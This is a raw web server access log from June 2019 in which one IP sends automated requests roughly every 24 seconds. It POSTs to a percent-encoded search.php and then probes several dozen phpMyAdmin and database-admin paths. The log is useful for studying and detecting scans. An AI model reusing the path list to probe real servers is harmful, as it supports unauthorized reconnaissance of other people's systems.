59.46.79.10 - - [18/Jun/2019:17:18:25 +0800] "POST /%73%65%61%72%63%68%2e%70%68%70 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:18:49 +0800] "POST /%73%65%61%72%63%68%2e%70%68%70 HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:19:14 +0800] "GET /index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:19:38 +0800] "GET /phpmyadmin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:20:02 +0800] "GET /phpMyAdmin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:20:26 +0800] "GET /pmd/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:20:50 +0800] "GET /pma/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:21:14 +0800] "GET /PMA/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:21:38 +0800] "GET /PMA2/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
42.236.10.116 - - [18/Jun/2019:17:21:48 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36"
59.46.79.10 - - [18/Jun/2019:17:22:01 +0800] "GET /pmamy/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:22:26 +0800] "GET /pmamy2/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:22:50 +0800] "GET /mysql/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:23:14 +0800] "GET /admin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:23:38 +0800] "GET /db/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:24:02 +0800] "GET /dbadmin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:24:26 +0800] "GET /web/phpMyAdmin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:24:50 +0800] "GET /admin/pma/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:25:14 +0800] "GET /admin/PMA/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:25:37 +0800] "GET /admin/mysql/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
213.174.20.32 - - [18/Jun/2019:17:25:55 +0800] "GET / HTTP/1.1" 499 0 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
59.46.79.10 - - [18/Jun/2019:17:26:01 +0800] "GET /admin/mysql2/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:26:27 +0800] "GET /admin/phpmyadmin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:26:51 +0800] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:27:15 +0800] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:27:39 +0800] "GET /mysqladmin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:28:03 +0800] "GET /mysql-admin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:28:27 +0800] "GET /mysql_admin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:28:51 +0800] "GET /phpadmin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:29:13 +0800] "GET /phpAdmin/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:29:37 +0800] "GET /phpmyadmin0/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:30:02 +0800] "GET /phpmyadmin1/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
59.46.79.10 - - [18/Jun/2019:17:30:26 +0800] "GET /phpmyadmin2/index.php HTTP/1.1" 499 0 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
